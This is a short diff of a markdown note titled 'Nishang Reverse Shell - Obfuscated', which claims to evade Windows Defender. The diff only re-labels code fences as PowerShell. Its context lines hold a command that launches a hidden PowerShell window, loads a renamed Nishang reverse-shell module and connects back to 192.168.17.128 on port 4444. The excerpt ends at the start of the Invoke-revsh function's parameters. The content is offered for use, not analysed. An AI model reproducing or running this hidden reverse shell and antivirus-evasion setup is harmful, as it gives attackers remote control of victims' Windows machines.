@@ -2,11 +2,11 @@ Nishang Reverse Shell - Obfuscated
 
 *Evades Windows Defender*
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~PowerShell
 Start-Process powershell.exe -windowstyle hidden "import-module C:\Users\Admin\Desktop\invoke-revsh.ps1; invoke-revsh -reverse -ipaddress 192.168.17.128 -port 4444" ; exit
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~PowerShell
 function Invoke-revsh 
 {       
     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
